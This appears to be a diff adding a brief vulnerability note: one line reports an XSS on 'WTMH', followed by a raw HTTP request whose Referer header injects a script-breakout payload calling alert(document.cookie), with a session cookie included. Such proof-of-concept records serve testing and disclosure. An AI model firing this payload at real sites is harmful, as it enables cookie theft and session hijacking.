@@ -1,0 +1,20 @@
+Identified an XSS via post on WTMH.
+
+GET /core/ HTTP/1.1
+Host: www.teste.com
+Cookie: PHPSESSID=i6vojh15mvmttme9lkqurnj4vm
+Referer: https://www.teste.com/search?hl=en&q=testing9602"();}]9807></script>a<script>alert(document.cookie)</script>
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Not;A=Brand";v="24", "Chromium";v="128"
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Language: pt-BR,pt;q=0.9
+Sec-Ch-Ua-Mobile: ?0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
+Sec-Ch-Ua-Platform: "Windows"
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Dest: empty
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+Connection: keep-alive
